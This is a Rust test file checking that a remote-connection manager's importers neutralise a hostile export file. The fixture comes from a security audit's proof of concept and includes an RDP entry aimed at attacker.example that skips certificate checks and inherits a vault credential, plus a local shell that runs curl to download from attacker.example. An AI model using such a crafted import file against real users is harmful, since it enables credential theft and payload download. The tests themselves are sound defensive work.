//! An imported file may come from anyone: it must not bring credentials, relaxed certificate
//! checks, "no NLA" or programs to run, whatever the format says. The first test is the input of
//! the security review's proof of concept (`evil.json`).

mod common;

use common::*;
use portolano_core_model::{
    resolve_credential, Connection, ConnectionOptions, CredentialRef, DocumentStore, Folder, Node,
};
use portolano_importers::{apply, preview, ImportFormat};
use uuid::Uuid;

fn write(dir: &TempDir, name: &str, text: &str) -> std::path::PathBuf {
    let path = dir.path(name);
    std::fs::write(&path, text).expect("write the file");
    path
}

/// The audit's input: an RDP entry that inherits the folder's credential, skips the certificate
/// check, allows no-NLA, plus a local shell that runs `curl`.
const EVIL: &str = r#"{"format":"portolano-export","version":1,"nodes":[
  {"type":"connection","id":"00000000-0000-0000-0000-000000000001","parentId":null,"name":"prod-dc01","host":"attacker.example","port":3389,
   "credential":{"type":"inherit"},"username":null,"tags":[],"notes":"",
   "options":{"type":"rdp","width":null,"height":null,"domain":null,"ignoreCert":true,"allowWithoutNla":true}},
  {"type":"connection","id":"00000000-0000-0000-0000-000000000002","parentId":null,"name":"jump-shell","host":"","port":null,
   "credential":{"type":"none"},"username":null,"tags":[],"notes":"",
   "options":{"type":"localShell","program":"/usr/bin/curl","args":["-s","http://attacker.example/x","-o","/tmp/x"],"cwd":null}},
  {"type":"connection","id":"00000000-0000-0000-0000-000000000003","parentId":null,"name":"plain-shell","host":"","port":null,
   "credential":{"type":"inherit"},"username":null,"tags":[],"notes":"",
   "options":{"type":"localShell","program":null,"args":[],"cwd":null}},
  {"type":"connection","id":"00000000-0000-0000-0000-000000000004","parentId":null,"name":"ssh-box","host":"box.example","port":null,
   "credential":{"type":"id","id":"00000000-0000-0000-0000-0000000000aa"},"username":"ops","tags":[],"notes":"",
   "options":{"type":"ssh","jumpHost":null,"keepaliveSecs":null}}
]}"#;

#[test]
fn the_audit_poc_file_is_neutralised_and_the_user_is_told() {
    let dir = TempDir::new("evil");
    let p = preview(ImportFormat::Json, &write(&dir, "evil.json", EVIL)).expect("preview");

    // The RDP entry: no credential, certificate check on, NLA required.
    let rdp = connection(&p, "prod-dc01");
    assert_eq!(rdp.credential, CredentialRef::None);
    match &rdp.options {
        ConnectionOptions::Rdp {
            ignore_cert,
            allow_without_nla,
            ..
        } => {
            assert!(!ignore_cert);
            assert!(!allow_without_nla);
        }
        other => panic!("expected rdp options, got {other:?}"),
    }

    // The local shell that runs curl is not imported at all; the plain one is.
    assert!(!connection_names(&p).contains(&"jump-shell".to_owned()));
    assert!(!json(&p).contains("curl"));
    let plain = connection(&p, "plain-shell");
    assert_eq!(plain.credential, CredentialRef::None);
    assert!(matches!(
        plain.options,
        ConnectionOptions::LocalShell { program: None, .. }
    ));
    assert_eq!(connection(&p, "ssh-box").credential, CredentialRef::None);

    // Nothing is silent.
    let warnings = warning_messages(&p);
    assert!(
        warnings.iter().any(|w| w.contains("'jump-shell'")
            && w.contains("local shell entries with a custom program are not imported")),
        "{warnings:?}"
    );
    assert!(
        warnings
            .iter()
            .any(|w| w.contains("credential reference") && w.contains("'prod-dc01'")),
        "{warnings:?}"
    );
    assert!(
        warnings.iter().any(
            |w| w.contains("do not verify the server certificate") && w.contains("'prod-dc01'")
        ),
        "{warnings:?}"
    );
    assert!(
        warnings
            .iter()
            .any(|w| w.contains("without NLA") && w.contains("'prod-dc01'")),
        "{warnings:?}"
    );
}

#[test]
fn imported_nodes_do_not_inherit_the_credential_of_the_folder_they_land_in() {
    let dir = TempDir::new("land");
    let p = preview(ImportFormat::Json, &write(&dir, "evil.json", EVIL)).expect("preview");
    let mut store = DocumentStore::new(dir.path("connections.json"));
    let vault_credential = Uuid::from_u128(900);
    let target = Uuid::from_u128(901);
    store
        .upsert_node(Node::Folder(Folder {
            id: target,
            parent_id: None,
            name: "Domain admins".into(),
            credential: CredentialRef::Id {
                id: vault_credential,
            },
        }))
        .expect("target folder");
    apply(&mut store, Some(target), &p).expect("apply");

    let doc = store.document();
    for name in ["prod-dc01", "plain-shell", "ssh-box"] {
        let id = id_of(&p, name);
        assert_eq!(
            resolve_credential(doc, id).expect("resolve"),
            None,
            "{name} must not pick up the folder's vault credential"
        );
    }
}

#[test]
fn repetitive_findings_are_grouped_into_one_warning() {
    let dir = TempDir::new("grouped");
    let mut nodes = Vec::new();
    for n in 1..=6u128 {
        nodes.push(serde_json::json!({
            "type": "connection", "id": Uuid::from_u128(n).to_string(), "parentId": null,
            "name": format!("rdp{n}"), "host": format!("h{n}.example"), "port": null,
            "credential": {"type": "inherit"}, "username": null, "tags": [], "notes": "",
            "options": {"type": "rdp", "width": null, "height": null, "domain": null, "ignoreCert": true}
        }));
    }
    let file = serde_json::json!({"format": "portolano-export", "version": 1, "nodes": nodes});
    let p = preview(
        ImportFormat::Json,
        &write(&dir, "many.json", &file.to_string()),
    )
    .expect("preview");
    assert_eq!(warnings_containing(&p, "credential reference"), 1);
    assert_eq!(
        warnings_containing(&p, "do not verify the server certificate"),
        1
    );
    let grouped = warning_messages(&p)
        .into_iter()
        .find(|w| w.contains("credential reference"))
        .expect("warning");
    assert!(grouped.starts_with("6 credential references"), "{grouped}");
    assert!(grouped.contains("and 3 more"), "{grouped}");
}

#[test]
fn a_clean_file_has_no_neutralising_warnings() {
    let dir = TempDir::new("clean");
    let file = serde_json::json!({"format": "portolano-export", "version": 1, "nodes": [{
        "type": "connection", "id": Uuid::from_u128(1).to_string(), "parentId": null,
        "name": "ok", "host": "ok.example", "port": null,
        "credential": {"type": "none"}, "username": null, "tags": [], "notes": "",
        "options": {"type": "rdp", "width": null, "height": null, "domain": null, "ignoreCert": false}
    }]});
    let p = preview(
        ImportFormat::Json,
        &write(&dir, "ok.json", &file.to_string()),
    )
    .expect("preview");
    assert!(
        warning_messages(&p).is_empty(),
        "{:?}",
        warning_messages(&p)
    );
}

/// The same safe defaults hold for the sanitising step itself, whatever parser fed it.
#[test]
fn every_other_format_yields_safe_defaults_too() {
    let dir = TempDir::new("formats");
    let rdp = write(
        &dir,
        "desk.rdp",
        "full address:s:desk.example\nusername:s:ann\n",
    );
    let p = preview(ImportFormat::Rdp, &rdp).expect("rdp");
    let desk = connection(&p, "desk");
    assert_eq!(desk.credential, CredentialRef::None);
    assert!(matches!(
        desk.options,
        ConnectionOptions::Rdp {
            ignore_cert: false,
            allow_without_nla: false,
            ..
        }
    ));

    let ssh = write(&dir, "config", "Host a\n  HostName a.example\n");
    let p = preview(ImportFormat::SshConfig, &ssh).expect("ssh config");
    for node in &p.nodes {
        match node {
            Node::Connection(Connection { credential, .. }) => {
                assert_eq!(*credential, CredentialRef::None)
            }
            Node::Folder(Folder { credential, .. }) => assert_eq!(*credential, CredentialRef::None),
        }
    }
}
